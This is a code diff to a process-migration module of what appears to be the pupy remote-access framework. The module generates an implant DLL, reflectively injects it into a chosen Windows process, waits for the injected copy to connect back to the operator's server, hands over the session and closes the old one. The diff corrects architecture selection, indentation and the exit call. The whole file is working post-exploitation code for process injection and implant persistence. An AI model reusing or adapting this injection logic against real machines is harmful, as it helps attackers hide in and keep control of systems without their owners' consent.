@@ -1,5 +1,6 @@
 import pupygen
 import time
+import rpyc
 
 def has_proc_migrated(client, pid):
     for c in client.pupsrv.clients:
@@ -17,36 +18,44 @@ def migrate(module, pid, keep=False, timeout=30):
     host, port=res.rsplit(':',1)
     module.success("address configured is %s:%s ..."%(host,port))
     module.success("looking for process %s architecture ..."%pid)
+    arch = None
     if module.client.conn.modules['pupwinutils.processes'].is_process_64(pid):
         isProcess64bits=True
+        arch='x64'
         module.success("process is 64 bits")
     else:
+        arch='x86'
         module.success("process is 32 bits")
 
     dllbuff, filename, _ = pupygen.generate_binary_from_template(
         module.client.get_conf(), 'windows',
-        arch=module.client.arch, shared=True
+        arch=arch, shared=True
     )
     module.success("Template: {}".format(filename))
 
     module.success("injecting DLL in target process %s ..."%pid)
     module.client.conn.modules['pupy'].reflective_inject_dll(pid, dllbuff, isProcess64bits)
     module.success("DLL injected !")
+
     if keep:
         return
+
     module.success("waiting for a connection from the DLL ...")
     time_end = time.time() + timeout
     c = False
+    mexit = rpyc.async(module.client.conn.exit)
     while time.time() < time_end:
-	c=has_proc_migrated(module.client, pid)
+        c = has_proc_migrated(module.client, pid)
         if c:
-		module.success("got a connection from migrated DLL !")
-		c.desc["id"]=module.client.desc["id"]
-		time.sleep(0.1)
-		try:
-			module.client.conn.exit()
-		except Exception:
-			pass
-		break
-    if not c:
-	module.error("migration failed")
+            module.success("got a connection from migrated DLL !")
+            c.pupsrv.move_id(c, module.client)
+            time.sleep(0.5)
+            try:
+                mexit()
+                module.success("migration completed")
+            except Exception:
+                pass
+
+            break
+
+        time.sleep(1)
